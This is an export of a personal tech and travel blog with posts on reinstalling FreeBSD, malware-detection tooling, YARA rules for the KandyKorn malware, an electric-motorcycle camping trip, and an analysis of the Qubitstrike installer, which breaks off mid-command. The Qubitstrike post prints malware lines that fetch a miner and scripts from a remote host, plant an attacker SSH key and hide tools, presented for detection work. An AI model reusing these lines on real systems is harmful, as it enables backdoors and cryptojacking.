{"username":"thomrstrom","has_pass":false,"email":"t+writeas@stromberg.org","created":"2022-07-18T13:52:39Z","status":null,"subscription":null,"collections":[{"alias":"thomrstrom","title":"unfinished.bike","description":"a compendium of half-finished projects by thomas strömberg - \u003ca rel=\"me\" href=\"https://triangletoot.party/@thomrstrom\"\u003e@thomrstrom\u003c/a\u003e","style_sheet":"","public":true,"views":6018,"domain":"unfinished.bike","url":"https://unfinished.bike/","monetization_pointer":"","verification_link":"","total_posts":26,"posts":[{"id":"9vk9wwde4ahfqknp","slug":"reinstalling-our-home-storage-server-with-jetkvm","appearance":"norm","language":"en","rtl":false,"type":"post","created":"2025-06-21T17:45:17Z","updated":"2025-06-21T18:06:28Z","title":"Reinstalling our home storage server with JetKVM","body":"My home office space has been offline for the last two months due to the invasion of 20,000 honeybees. This article is not about that story.\n\nHowever, when putting everything back into its place, I knew my home storage server running FreeBSD 15-CURRENT was overdue for a wipe and reinstall: it’d been 4 houses, several years, and a handful of domain names since it was initially installed.\n\nOne thing I hate about having a home lab is needing to crawl around to fetch a keyboard and monitor for reinstall and recovery ops. Enter the JetKVM, a nifty little device that promised to make this painful process a bit more bearable.\n\n## Setting Up the JetKVM\n\n![](https://i.snap.as/reYWlYKR.jpg)\n\nJetKVM is a tiny \u0026 cheap hardware KVM-over-IP solution that lets you remotely control servers via a web browser. I’d ordered mine months ago via Kickstarter, but today was my first shot at using it.\n\nGetting the JetKVM ready was refreshingly straightforward:\n\n* Connect the HDMI cable\n* Connect the USB-C cable\n* Connect Ethernet\n* Visit IP displayed on it’s tiny little screen with a web browser\n\nOnce I turned the machine on, I was greeted with a familiar boot screen that we’ve seen on PC devices since the 1980’s.\n\n## Mapping Out the Existing Storage\n\nI had 10TB of data on this machine to preserve, so I wanted to get a quick map of which disks were what before accidentally wiping something. If I’d been less lazy, I would have unplugged the drives with data.\n\n`zpool status -v` revealed my storage layout:\n\n* **slow**: ada1 (14TB spinning disk - my bulk storage)\n* **zroot**: nda0p4 (NVMe drive confirmed via the [nda(4) man page](https://man.freebsd.org/cgi/man.cgi?nda(4)))\n* **fast**: ada0 (4TB SATA drive)\n\nFreeBSD's device naming is logical once you know the patterns: `nda` for NVMe, `ada` for SATA/PATA drives.\n\n## Booting FreeBSD ISO using JetKVM Virtual Media\n\nFrom my MacBook Pro, I started to setup a bootable USB drive using this classic incantation:\n\n```\nsudo diskutil list | grep external\n/dev/disk4 (external, physical):\n```\n\n```\nsudo dd if=$HOME/Downloads/FreeBSD-15.0-CURRENT-amd64-20250612-e6928c33f60c-277883-mini-memstick.img of=/dev/disk4s1 bs=10240\n```\n\nI used the JetKVM virtual keyboard to insert the “Del” button to enter BIOS and set the boot device order up so that it would boot off of the USB stick. But wait, what’s this “JetKVM Virtual Media” device?\n\n![](https://i.snap.as/MzkNuTvW.png)\n\nThen I noticed this curious “Virtual Media” button in the JetKVM screen - was it possible to upload a disk image to this thing and boot it up without worrying about USB sticks and dd commands? It turns out you can - what a game changer:\n\n* Click “Virtual Media\n* Click “Add New Media”\n* Click “JetKVM Storage Mount”\n* Select local file, click Upload\n* Click “Mount File”\n\n![](https://i.snap.as/tptuHGa1.png)\n\nOne quirk I discovered for FreeBSD is that only the CD/DVD ISO image boots properly via JetKVM Virtual Media, not the memstick images.\n\n## Navigating Installation Quirks\n\n![](https://i.snap.as/JZ2KuK5n.png)\n\nIt’s been nearly 30 years after my first FreeBSD installation (2.2.0), and I still find new quirks that cause me to go into menu loops. This time it did not like that my system already had a “zroot” pool defined. This was easy enough to fix by selecting the “Shell” option from the partitioning menu:\n\n```\nzpool import zroot\nzpool destroy zroot\n```\n\nAfter that, the rest was smooth sailing.\n\n![](https://i.snap.as/7uQwCNof.png)\n\n## Configuring Remote Access\n\nThe JetKVM is fine as an emergency connectivity option, but nothing beats SSH and a static IP for ease of use. I immediately dove into `/etc/rc.conf` and defined:\n\n```bash\nifconfig_igb0=\"inet 10.9.8.7 netmask 255.255.255.0\"\n```\n\nFreeBSD makes it easy to reconfigure interfaces based on the stored configuration:\n\n```bash\n/etc/rc.d/netif restart\n```\n\nI like configuring SSH (`/etc/sshd/sshd.conf`) avoid brute-force attacks from flooding the logs, as well as make them hopeless:\n\n```\nPort 32022\nPasswordAuthentication no\nKbdInteractiveAuthentication no\nPermitRootLogin yes\n```\n\nAnother quick service restart and SSH was ready:\n\n```bash\n/etc/rc.d/sshd restart\n```\n\n## The Connectivity Plot Twist\n\nHere's where my smooth reinstall hit a snag. After getting everything configured, I couldn't reach GitHub:\n\n```bash\n$ git clone https://github.com/tstromberg/commit-etc.git\nCloning into 'commit-etc'...\nfatal: unable to access 'https://github.com/tstromberg/commit-etc.git/': Failed to connect to github.com port 443 after 23 ms: Could not connect to server\n```\n\nDNS was working fine - `host github.com` returned the expected results:\n\n```bash\n$ host github.com\ngithub.com has address 140.82.114.4\ngithub.com mail is handled by 10 alt4.aspmx.l.google.com.\ngithub.com mail is handled by 1 aspmx.l.google.com.\n...\n```\n\nBut trying to actually connect revealed the issue:\n\n```bash\n$ curl -vvv github.com\n== Info: Host github.com:80 was resolved.\n== Info: IPv4: 140.82.112.4\n== Info:   Trying 140.82.112.4:80...\n== Info: Immediate connect fail for 140.82.112.4: Network is unreachable\n== Info: Failed to connect to github.com port 80 after 23 ms: Could not connect to server\ncurl: (7) Failed to connect to github.com port 80 after 23 ms: Could not connect to server\n```\n\nThe culprit? I'd forgotten to set the default gateway. I added `defaultrouter=\"10.9.8.1\"` to `/etc/rc.conf` and restarted routing:\n\n```bash\n/etc/rc.d/routing restart\n```\n\nI liked having the extra security blanket of the JetKVM in case I botched the networking configuration.\n\n## Essential Tools and Services\n\nOnce connectivity was restored, I could install my usual set of server tools:\n\n```bash\npkg install tmux fish git doas rsync go syncthing\n```\n\nSyncThing gets special mention here as my go-to solution for keeping files synchronized across machines. It deserves it's own article, but getting it running is just:\n\n```bash\nsysrc syncthing_enable=YES\n/usr/local/etc/rc.d/syncthing start\n```\n\nThe `sysrc` command is FreeBSD's clean way to modify `/etc/rc.conf` programmatically - less error prone than manual edits.\n\n## Configuration Management\n\nI also needed to get my system configuration management back online. My approach is to keep `/etc` under version control with a simple script setup:\n\n```bash\ngit clone https://github.com/tstromberg/commit-etc.git\n\ncp commit-etc.sh $HOME/commit-etc\n\n$HOME/commit-etc/commit-etc.sh\n\necho \"0 0 * * * $HOME/commit-etc/commit-etc.sh\" |crontab -e\n```\n\nNow any system changes I make will be automatically translated into git commits.\n\n## Panic!\n\nThe FreeBSD “CURRENT” stream is considered “alpha” quality and well-known for stability issues. Even so, I was surprised to get a panic so quickly, induced by my attempt to sync terrabytes worth of data to an external drive via USB 3.0:\n\n![](https://i.snap.as/2TlmwQiF.png)\n\nThe JetKVM proved its worth here too - as it made persistent out-of-band access to my server a painless affair. Otherwise, I would have had to fetch a monitor out to see the panic message.\n\nAfter some tweaks, FreeBSD 15-CURRENT is running smoothly now, with a clean ZFS setup and all my essential services back online. The combination of solid documentation (those man pages!), logical device naming, and straightforward service management makes FreeBSD a pleasure to work with, even during major system changes.","tags":[],"images":["https://i.snap.as/reYWlYKR.jpg","https://i.snap.as/MzkNuTvW.png","https://i.snap.as/tptuHGa1.png","https://i.snap.as/JZ2KuK5n.png","https://i.snap.as/7uQwCNof.png","https://i.snap.as/2TlmwQiF.png"],"paid":false,"full_post_url":"","views":35,"likes":0,"collection":{"alias":"thomrstrom","title":"unfinished.bike","description":"a compendium of half-finished projects by thomas strömberg - \u003ca rel=\"me\" href=\"https://triangletoot.party/@thomrstrom\"\u003e@thomrstrom\u003c/a\u003e","style_sheet":"","public":true,"views":6018,"domain":"unfinished.bike","url":"https://unfinished.bike/","monetization_pointer":"","verification_link":"","total_posts":0}},{"id":"am9w8rhw71k1f7mv","slug":"detecting-the-lottie-supply-chain-attack-with-malcontent","appearance":"norm","language":"en","rtl":false,"type":"post","created":"2024-11-01T01:36:21Z","updated":"2024-11-01T01:39:31Z","title":"Detecting the Lottie supply-chain attack with malcontent","body":"Some of you may have heard that there was [another supply-chain attack against an open-source project yesterday](https://github.com/LottieFiles/lottie-player/issues/254) - this time in a Javascript library called [Lottie Web Player.](https://lottiefiles.com/web-player)\n\nI have yet to talk much about it, but earlier this year I started an open-source project named [malcontent](https://github.com/chainguard-dev/malcontent) that detects precisely this kind of attack: malicious changes in open-source software. This is very relevant to my day job at [Chainguard](https://www.chainguard.dev/).\n\nmalcontent summarizes the risks and capabilities of a file and alerts when a new version substantially changes those risks and capabilities. It's easier to show you with a screenshot:\n\n![](https://i.snap.as/4ywoSN73.png)\n\nIn a nutshell:  `mal diff` calculated that the risk of file went from MEDIUM to CRITICAL between two revisions. In doing so, it surfaced a number of new behaviors that would catch the eye of a code reviewer. The idea here is that no tool will be able to give you a 100% reliable answer to “Is it malicious or not?” but as a code reviewer, you have the context of what functionality changes are reasonable to you for the library you are consuming.\n\n[malcontent](https://github.com/chainguard-dev/malcontent) works on any file you might encounter in open source, from shell scripts to Linux ELF binaries to macOS machO binaries and PHP. While we’ve incorporated over 15,000 [YARA rules](https://yara.readthedocs.io/en/stable/index.html), we're far from the same quality level as VirusTotal; so if you are handy in YARA or [Go](https://go.dev/) or would like to learn more about them, PRs are welcome!\n\nPS - malcontent can also be used as a basic malware scanner - but it isn’t yet as impressive as the “diff” mode:  `mal scan /path`","tags":[],"images":["https://i.snap.as/4ywoSN73.png"],"paid":false,"full_post_url":"","views":223,"likes":0,"collection":{"alias":"thomrstrom","title":"unfinished.bike","description":"a compendium of half-finished projects by thomas strömberg - \u003ca rel=\"me\" href=\"https://triangletoot.party/@thomrstrom\"\u003e@thomrstrom\u003c/a\u003e","style_sheet":"","public":true,"views":6018,"domain":"unfinished.bike","url":"https://unfinished.bike/","monetization_pointer":"","verification_link":"","total_posts":0}},{"id":"az8f2d4e35rtrldf","slug":"motocamping-with-the-bmw-ce-04","appearance":"norm","language":"en","rtl":false,"type":"post","created":"2023-11-21T14:45:38Z","updated":"2023-11-21T14:50:57Z","title":"Motocamping with the BMW CE 04","body":"This weekend, I took my funky electric BMW CE 04 camping at the edge of the Uwharrie Mountains for 3 days, covering 170 miles (270km). The trip was a breeze, so skip this post if you are looking for drama.\n\n![](https://lh7-us.googleusercontent.com/Yc4TgQRC5rQVV2YpB-e8lIHSbq4_FkZjo7Xg-2fyY0HmshATmloYfWRgo8YzUqe7_QT-ERC3zHv7RIuxsE77-7bvLWAtwke7IqFhIY6p3U2Dus4xTOxT3bHMk4i8s4jySumVTFONmEmNmlnfFaI6R-g)\n\n\u003c!--more--\u003e\n\nThis was an unofficial camping trip with folks from my daughter’s girl scout troop. She wanted to travel with her friends, but I still had to be prepared to take her home on the bike, so everything had to fit for the two of us:\n\n![](https://i.snap.as/muZaam1b.png)\n\nFrom a packing perspective, the most creative thing I did was tape my tools to the back of the helmet compartment in the CE 04. There is an indented area on the back wall there that is otherwise unused:\n\n![](https://i.snap.as/33ChGaLa.jpg)\n\nOnce that’s in, the helmet compartment still easily fits a helmet or two sleeping bags and a J1772 charger cable:\n\n![](https://i.snap.as/D5GDXs36.jpg)\n\nI didn’t mind if the tent and chairs got wet, so I placed them up against the top case.\n\nThe route I picked was setup so that I would charge twice in each direction so that I would have enough range to find a “Plan B” in case of a charging problem.  I found the chargers using PlugShare and then plugged them into BMW’s navigation software to find the twistiest route possible:\n\n![](https://lh7-us.googleusercontent.com/8i9AKoBIXsuBJmsDurX4ryC0znXZeVc4nq0vEE7nj6Ku9K4g8yJUfKL7VnLtuo2MukyP02s2venwKyXVDKjVgNhQnzFvfMjRNVFMWjzy8e1SRFpu1ysTAEgYV2plDgYJXHFdWLWZJdUIWXhQQlGJjLA)\n\nThe first river crossing was the Haw River, named after the native tribe that once occupied this area. The tribe disappeared through death and assimilation after 1715, but the place names live on in their memory. North Carolina is filled with Native American history, and even today, North Carolina has the highest number of Native American residents (122,000) this side of the Mississippi.\n\n![](https://i.snap.as/xmbebIjJ.jpg)\n\nThe first charging stop was at Welford Harris Ford in Siler City, where a most curious and friendly manager welcomed me. He’d never seen an electric motorcycle before. I usually avoid charging at car dealerships because they have the lowest likelihood of functioning in my experience. Dealerships never seem to have more than 1 charging port, which is often deactivated, locked away, in use by a dealership car, or deemed customers only.\n\n![](https://i.snap.as/4M3MR8Qv.jpg)\n\nWelford Harris Ford, on the other hand, is exceptionally friendly and has a great food options nearby, so you can fill your belly while you fill your battery:\n\n![](https://i.snap.as/3V9mYXU0.jpg)\n\nBy the time I had lunch and returned to the bike, it had charged from 43% to 100%. Heading south from there toward the Deep River, I was soon welcomed by a series of abandoned barns, chicken coops \u0026 textile mills. Also: rain. Not enough to slow me down too much, but enough to make me take the curves carefully as they were filled with wet fall leaves.\n\n![](https://i.snap.as/Y1O6nh5j.jpg)\n\nAt the Deep River, I encountered [Coleridge, home of Enterprise Manufacturing](https://northcarolinahistory.org/encyclopedia/coleridge/) - this cotton mill was built in the late 1800s, it’s been shuttered for the last 65 years:\n\n![](https://i.snap.as/Mpk3O6mH.jpg)\n\nThere was even 3-4 miles of quiet gravel roads to enjoy. It still blows me away how well the CE 04 handles gravel. Somehow, I feel more confident. on it in gravel than I did with my old F650GS Dakar.\n\n![](https://i.snap.as/W6CDwhTQ.jpg)\n\nJust south of Asheboro, I stopped at the [North Carolina Zoo](https://www.nczoo.org/) for a free charge and a much needed bathroom break. I’m always skeptical of free chargers, as people often unnecessarily camp their cars out at them. It’s a cold \u0026 rainy day, and the zoo provides more chargers (6!) than anywhere else I’ve been outside of a Tesla Supercharger, so it was no hassle.\n\n![](https://i.snap.as/GosO7sNb.jpg)\n\nI went a little out of my way to check out Seagrove, the Pottery Capital of the United States. There are more working potters per capita here than anywhere else in the US. Every building in the town seemed to cater to pottery somehow.\n\n![](https://i.snap.as/tnM4aek6.jpg)\n\nHeading south down via Ether Rd \u0026 Okeewemee (meaning “land between two rivers”), I avoided the highway and passed farm after farm: mostly cows, but also horses and sheep. I also noticed the youth of the trees here: it seems like everything around me had been clear-cut at least once in the last 25 years.\n\nI soon arrived at our campground, an old farm in Troy, NC. It was gorgeous and peaceful. The host, Karl, was exceptionally welcoming and gregarious. He showed me around the expansive property, where I could charge my bike and place my tent, and welcomed me into his home. We soon had a campfire with smores.\n\n![](https://i.snap.as/G2sFIzYC.jpg)\n\nMy new tent, the [Big Agnes Tiger Wall 2 (bikepacking version)](https://www.bigagnes.com/collections/tiger-wall-ul-bikepack-solution-dye-series/products/tiger-wall-ul-2-bikepack) was easy to set up and did not leak any rain: it’ll cozily fit two people and their gear and packs up exceptionally small. After a good nights rest, I woke up early in the morning to take some photos of the farm:\n\n![](https://i.snap.as/krevJcfT.jpg)\n\n![](https://i.snap.as/xAmnfPXu.jpg)\n\n![](https://i.snap.as/UNVOPSHU.jpg)\n\n![](https://i.snap.as/nzcQH2Om.jpg)\n\nWe made a day of going to the North Carolina Zoo in Asheboro, where I found my spirit animal, the [Colorado River Toad](https://en.wikipedia.org/wiki/Colorado_River_toad). I had read about the psychotropic characteristics of this species as a teenager and soon referred to my peers as “toadblowers” for reasons I still don’t understand.\n\n![](https://i.snap.as/tb0m8AiH.jpg)\n\nThe next day it was time to head home. As I had initially planned for my daughter to join me on the way home, I selected a known good route home with known-good EV charging options. She, however, decided to ride back with her friends, so I took the time to scout out some new charging options. Here’s the Blink Charger at Montgomery Ford in Troy, NC - you can charge a bike here, but they always leave a Mustang Mach-E parked here, so don’t count on charging your car:\n\n![](https://i.snap.as/W1EJkKwG.jpg)\n\nThe nearby tiny town of Biscoe had a charger listed on PlugShare as vandalized and inoperable since July, so I dropped by to confirm that this is still the case. It’s weird to think that folks would vandalize an EV charger, but I imagine it was bored teenagers more than a nefarious group of anti-EV constituents.\n\n![](https://i.snap.as/6YxzIJse.jpg)\n\nRobbins, NC, has my vote for the most charming small town in the Piedmont. It has a lovely EV  charger near a great coffee shop, walking trails, and Carolina Fried Chicken and House of Pizza (aka “Chicken Hut”) I stopped here to recharge myself and the CE 04: by the time I returned to the bike, it was at 99%.\n\n![](https://i.snap.as/7Y5taLgW.jpg)\n\nAfter Robbins, I followed River Rd for a beautiful twisty route along the Deep River. The fall leaves and gentle curves quickly instilled a sense of peace in me. The next and final planned stop was the charger at the Goldston Public Library, where I arrived with a 53% charge.\n\n![](https://i.snap.as/tp3kW1aH.jpg)\n\nI was in a hurry to get home and made the mistake of going by intuition and unplugging the bike at 68% rather than looking up how much charge I needed. I thought I only needed a 55% charge to get home from there, but it turned out to be 72% - so I made one last charging top-off at the Chatham County Agriculture \u0026 Conference Center to add another 15% onto the bike before reaching home.\n\n![](https://i.snap.as/4M06wfSN.jpg)\n\nThinking back to this trip, it amazes me how many people went into making such an adventure possible: from the folks who organized the campout to the engineers who designed the EV chargers, and the people who built the roads. It’s a good reminder that behind all this amazing technology is a sea of people working together for the greater good of. the world.\n\nThat thought fills my heart. Until next time, keep the shiny side up.","tags":[],"images":["https://i.snap.as/muZaam1b.png","https://i.snap.as/33ChGaLa.jpg","https://i.snap.as/D5GDXs36.jpg","https://i.snap.as/xmbebIjJ.jpg","https://i.snap.as/4M3MR8Qv.jpg","https://i.snap.as/3V9mYXU0.jpg","https://i.snap.as/Y1O6nh5j.jpg","https://i.snap.as/Mpk3O6mH.jpg","https://i.snap.as/W6CDwhTQ.jpg","https://i.snap.as/GosO7sNb.jpg","https://i.snap.as/tnM4aek6.jpg","https://i.snap.as/G2sFIzYC.jpg","https://i.snap.as/krevJcfT.jpg","https://i.snap.as/xAmnfPXu.jpg","https://i.snap.as/UNVOPSHU.jpg","https://i.snap.as/nzcQH2Om.jpg","https://i.snap.as/tb0m8AiH.jpg","https://i.snap.as/W1EJkKwG.jpg","https://i.snap.as/6YxzIJse.jpg","https://i.snap.as/7Y5taLgW.jpg","https://i.snap.as/tp3kW1aH.jpg","https://i.snap.as/4M06wfSN.jpg"],"paid":false,"full_post_url":"","views":170,"likes":0,"collection":{"alias":"thomrstrom","title":"unfinished.bike","description":"a compendium of half-finished projects by thomas strömberg - \u003ca rel=\"me\" href=\"https://triangletoot.party/@thomrstrom\"\u003e@thomrstrom\u003c/a\u003e","style_sheet":"","public":true,"views":6018,"domain":"unfinished.bike","url":"https://unfinished.bike/","monetization_pointer":"","verification_link":"","total_posts":0}},{"id":"5tidf7a8yfkrpj85","slug":"the-power-of-generic-yara-detectors","appearance":"norm","language":"en","rtl":false,"type":"post","created":"2023-11-04T01:53:25Z","updated":"2023-11-04T02:51:14Z","title":"KANDYKORN and the power of generic YARA detectors","body":"At my current employer, nation-state actors are part of our threat model. So, I get a little excited when someone posts malware that is tied to one of the big-4 (China, North Korea, Russia, United States of America). Last week, Elastic Security Labs posted an article titled [DPRK passing out KANDYKORN](https://www.elastic.co/security-labs/elastic-catches-dprk-passing-out-kandykorn) outlining the latest macOS malware discovery from North Korea, and this week a sample appeared in the [Objective-See Malware collection](https://github.com/objective-see/Malware) for inspection.\n\n![](https://i.snap.as/ZPNXRdih.webp)\n\nI threw our [YARA](https://yara.readthedocs.io/en/v3.4.0/index.html) queries at Kandy Korn, and found that 2 of the 3 binaries were identified as suspicious:\n\n\u003c!--more--\u003e\n\n```log\nMEDIUM objective-see/KandyKorn/kandykorn\n  * generic_scan_tool\n      f_gethostbyname: gethostbyname\n      f_socket: socket\n      f_connect: connect\n      o_probe: probe\n      o_port: port\n  - sha256: 927b3564c1cf884d2a05e1d7bd24362ce8563a1e9b85be776190ab7f8af192f6\n/Users/t/src/malware/objective-see/KandyKorn/log\n\nMEDIUM objective-see/KandyKorn/log\n  * opaque_macho_binary\n      word_with_spaces: ja kw\n  - sha256: 3ea2ead8f3cec030906dcbffe3efd5c5d77d5d375d4a54cca03bfe8a6cb59940\n```\n\nHowever, no virus scanners could detect this Malware until this week. That's the power of generic YARA detectors: once you define your baseline of normalcy, you can detect the truly weird things that circulate through your network.\n\n## Two generic YARA techniques worth trying\n\nWhat do I mean by a generic YARA detector? I mean YARA rules that are designed to match multiple kinds of suspicious binaries, even those you have never seen before. \n\nI'm going to share these two YARA rules that were capable of catching KandyKorn before it was published. The first generic query detects portscanners - it’s what I refer to as a “capabilities-based” detector:\n\n```yara\nrule generic_scan_tool {\n  strings:\n    $f_gethostbyname = \"gethostbyname\"\n    $f_socket = \"socket\"\n    $f_connect = \"connect\"\n    $o_banner = \"banner\"\n    $o_Probe = \"Probe\"\n    $o_probe = \"probe\"\n    $o_scan = \"scan\"\n    $o_port = \"port\"\n  condition:\n    all of ($f*) and any of ($o*)\n}\n```\n\nThis rule works by trying to guess at the capabilities of a program by parsing through strings it mentions. YARA rules excel at discovering the latent capabilities of a program, which can ocassionally catch things that behavioral analysis misses.\n\nMy second favorite kind of detector is an obfuscation-detector: searching for binaries that seem to have gone through a process to hide the strings a capabilities-based detector might rely on. \n\nThis query uncovers Mach-O binaries that have been intentionally obfuscated, by measuring the number of words found with spaces between them:\n\n```yara\nrule opaque_macho_binary {\n  strings:\n    $word_with_spaces = /[a-z]{2,} [a-z]{2,}/\n  condition:\n    filesize \u003c 52428800 and (uint32(0) == 4277009102 or uint32(0) == 3472551422 or uint32(0) == 4277009103 or uint32(0) == 3489328638 or uint32(0) == 3405691582 or uint32(0) == 3199925962) and #word_with_spaces \u003c 4\n}\n```\n\nThe idea is that very few Mach-O binaries have no sentence references. These sentences are sometimes error messages, sometimes usage messages, and sometimes phrases that are displayed to the screen. Almost no binaries have less than 4 words with spaces.\n\nSince writing this rule, I haven't seen that alert fire for anything other than malware, and it has caught quite a few samples.\n\nHere's a bonus query that matches the \"Discord\" binary by way of looking at its capabilities. This query Swift binaries that ship with a debugging entitlement and references executables, which isn't a common combination. This entitlement is normally stripped when you ship a binary, but I guess the DPRK did not get that memo.\n\n```yara\nrule swift_debug_program_with_exec_ref {\n\tstrings:\n\t\t$task_allow = \"com.apple.security.get-task-allow\"\n\t\t$mh_execute_header = \"_mh_execute_header\"\n\t\t$executable = \"executable\"\n\t\t$swift_force_load = \"__swift_FORCE_LOAD\"\n\tcondition:\n\t\tall of them\n}\n```\n\nThis next generic query also matches [Janicab](https://archive.f-secure.com/weblog/archives/00002576.html), though I suspect it will also yield false positives:\n\n```yara\nrule executable_place_ref {\n\tstrings:\n\t\t$xecURL = \"xecURL\"\n\t\t$xecutableURL = \"xecutableURL\"\n\t\t$xecUrl = \"xecUrl\"\n\t\t$xecutableUrl = \"xecutableUrl\"\n\t\t$xecFile = \"xecFile\"\n\t\t$xecutableFile = \"xecutableFile\"\n\tcondition:\n\t\tany of them\n}\n```\nThe “kandykorn” binary has many opportunities to be matched generically based on latent capabilities. For example, very few programs list system pids and reference libcurl:\n\n```yara\nrule proc_listpids_and_curl {\n\tstrings:\n\t\t$proc_listpids = \"proc_listpids\"\n\t\t$libcurl = \"libcurl\"\n\tcondition:\n\t\tall of them\n}\n```\n\nSimilarly, the `log` binary (aka SUGARLOADER) can be matched by the following YARA query:\n\n```yara\nrule notification_dialog_with_sysctl_and_curl {\n\tstrings:\n\t\t$display_alert = \"CFUserNotificationDisplayAlert\"\n\t\t$socket = \"socket\"\n\t\t$sysctl = \"sysctl\"\n\t\t$getpid = \"getpid\"\n\t\t$curl = \"curl\"\n\tcondition:\n\t\tall of them\n}\n```\n\nSome may argue that generic queries like this are a headache due to false-positive management, but it depends on your mission and threat model: are you more interested in catching known or unknown malware? If the latter, try generic queries and aggressively update them to reduce the false positive rate to near zero. Consider all alerts to be actionable.\n\nIf you need hints as to what to match in your generic queries, here's an alias I keep around to extract the more important strings for UNIX binaries:\n\n```shell\nstrings - \"$1\" \n  | egrep \"/[a-zA-Z][a-z]{2,}|[A-Za-z]{4}|[a-zA-Z]{2}-[a-zA-Z]{2}|\\d+\\.\\d+\\.\\d+|[0-9a-f]:[0-9a-f]\" \n  | egrep -v \"^(__TEXT|__DATA|__text|__stubs|__cstring|__const|__data|__common|__LINKEDIT|__literals|__ojc_methname|__unwind_info|__mod_init_func|__obj_|__la_symbol_ptr|__eh_frame|__DATA_CONST|__PAGEZERO|__init_offsets|__swift5_.*|__objc_.*|AUAT.*|AVAUI.*)$\" | uniq\n```\n\nGood luck out there!","tags":["word_with_spaces"],"categories":[{"hashtag":"word_with_spaces","slug":"word_with_spaces","title":"word_with_spaces","post_count":0}],"images":["https://i.snap.as/ZPNXRdih.webp"],"paid":false,"full_post_url":"","views":178,"likes":0,"collection":{"alias":"thomrstrom","title":"unfinished.bike","description":"a compendium of half-finished projects by thomas strömberg - \u003ca rel=\"me\" href=\"https://triangletoot.party/@thomrstrom\"\u003e@thomrstrom\u003c/a\u003e","style_sheet":"","public":true,"views":6018,"domain":"unfinished.bike","url":"https://unfinished.bike/","monetization_pointer":"","verification_link":"","total_posts":0}},{"id":"wltjmy32c93akn49","slug":"qubitstrike-and-diamorphine-linux-kernel-rootkits-go-mainstream","appearance":"norm","language":"en","rtl":false,"type":"post","created":"2023-10-21T00:12:24Z","updated":"2023-10-21T11:35:45Z","title":"Qubitstrike: Linux kernel rootkits go mainstream","body":"Earlier this week, I stumbled into [Cado's report on Qubitstrike](https://www.cadosecurity.com/qubitstrike-an-emerging-malware-campaign-targeting-jupyter-notebooks/), an attack on publicly accessible [Jupyter notebook](https://jupyter.org/) installations. Unlike most security reports, the hosted malware files were still available, which meant I could analyze and validate our defenses against it. Normally, I don't get this opportunity to study emerging threats, as I'm not paying the $20,000/yr paywall fee for access to Google's VirusTotal service that most researchers seem to rely on.\n\n![](https://i.snap.as/KuU2dMIe.webp)\n\n\u003c!--more--\u003e\n\nI really like QubitStrike: it has a bit of everything and is easy to dissect. The most exciting thing about it is that it's the first example I've seen of casual attackers employing a kernel rootkit that actually works on the latest versions of popular Linux distributions. Let's take a tour!\n\n## The Qubitstrike Installer\n\nIf you ever wanted to study how your modern malware installer operates on Linux, the Qubitstrike installer script is the perfect case study for you - it's like a tasting tour of UNIX malware techniques in a single easy-to-read shell script.\n\n* Two Linux rootkits (kernel and user-mode)\n* Process hiding\n* Credential theft\n* An SSH backdoor\n* A viral component\n* A cryptocurrency miner\n* Telegram integration\n\nTo follow along, I've posted a copy of the original installer script here: [mi.sh](https://github.com/tstromberg/malware-menagerie/blob/main/linux/2023.Trojan_Miner.QubitStrike/installer/mi.sh). If you want to test the installer yourself within a VM, I've made a defanged copy of it that works without downloading content from codeberg: [local-mi.sh](https://github.com/tstromberg/malware-menagerie/blob/main/linux/2023.Trojan_Miner.QubitStrike/local_installer/local-mi.sh)\n\n### Installer Initialization\n\n```shell\nminer_url=\"https://codeberg.org/m4rt1/sh/raw/branch/main/xm64.tar.gz\"\nminer_name=\"python-dev\"\nkiller_url=\"https://codeberg.org/m4rt1/sh/raw/branch/main/killer.sh\"\nkill_url2=\"https://codeberg.org/m4rt1/sh/raw/branch/main/kill_loop.sh\"\npool=\"pool.hashvault.pro:80\"\nMD5=\"199b790d05724170f3e6583500799db1\"\nDIR=\"/usr/share/.LQvKibDTq4\"\nRSA=\"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDV+S/3d5qwXg1yvfOm3ZTHqyE2F0zfQv1g12Wb7H4N5EnP1m8WvBOQKJ2htWqcDg2dpweE7htcRsHDxlkv2u+MC0g1b8Z/HawzqY2Z5FH4LtnlYq1QZcYbYIPzWCxifNbHPQGexpT0v/e6z27NiJa6XfE0DMpuX7lY9CVUrBWylcINYnbGhgSDtHnvSspSi4Qu7YuTnee3piyIZhN9m+tDgtz+zgHNVx1j0QpiHibhvfrZQB+tgXWTHqUazwYKR9td68twJ/K1bSY+XoI5F0hzEPTJWoCl3L+CKqA7gC3F9eDs5Kb11RgvGqieSEiWb2z2UHtW9KnTKTRNMdUNA619/5/HAsAcsxynJKYO7V/ifZ+ONFUMtm5oy1UH+49ha//UPWUA6T6vaeApzyAZKuMEmFGcNR3GZ6e8rDL0/miNTk6eq3JiQFR/hbHpn8h5Zq9NOtCoUU7lOvTGAzXBlfD5LIlzBnMA3EpigTvLeuHWQTqNPEhjYNy/YoPTgBAaUJE= root@kali\"\n[[ $EUID -eq 0 ]] || DIR=\"/tmp/.LQvKibDTq4\" ;\n```\n\nEven the initialization part of the script contains multiple detection opportunities, as the following things are highly irregular to find in executables or shell scripts:\n\n* References to `codeberg.org/.*/raw/`\n* References to `hashvault` or `miner_`\n* References to hidden `/usr/share` and `/tmp` directories\n* SSH keys\n\n### Fetch Tools\n\n![](https://i.snap.as/jsHYhB4p.png)\n\nI'm now going to show the installer output in [debug mode (using `bash -x)`](https://tldp.org/LDP/Bash-Beginners-Guide/html/sect_02_03.html), as it usually makes the behavior easier to discern. If you are on a Linux distro that has \"apt\", \"yum\", or \"apk\" package manager available, the script will install curl or wget for you:\n\n```shell\n---------------------------------------\n INSTALLING WGET, CURL ...\n---------------------------------------\n+ type apt\n+ apt-get update --fix-missing\nHit:1 http://archive.ubuntu.com/ubuntu lunar InRelease                   \nHit:2 http://security.ubuntu.com/ubuntu lunar-security InRelease         \nHit:3 http://archive.ubuntu.com/ubuntu lunar-updates InRelease           \nHit:4 http://archive.ubuntu.com/ubuntu lunar-backports InRelease\nReading package lists... Done\n+ apt-get install wget curl -y\nReading package lists... Done\nBuilding dependency tree... Done\nReading state information... Done\nwget is already the newest version (1.21.3-1ubuntu1).\ncurl is already the newest version (7.88.1-8ubuntu2.3).\n0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.\n```\n\nA script or executable containing \"apt-get install wget curl -y\" is probably malware, so it's not a bad thing to alert on. Once a fetch tool is installed, it moves it to a new location to break future attackers, as well as bypass detection queries that look for `wget` or `curl`:\n\n```shell\n---------------------------------------\n Replacing WGET, CURL ...\n---------------------------------------\n+ sleep 1s\n+ [[ -f /usr/bin/wget ]]\n+ mv /usr/bin/wget 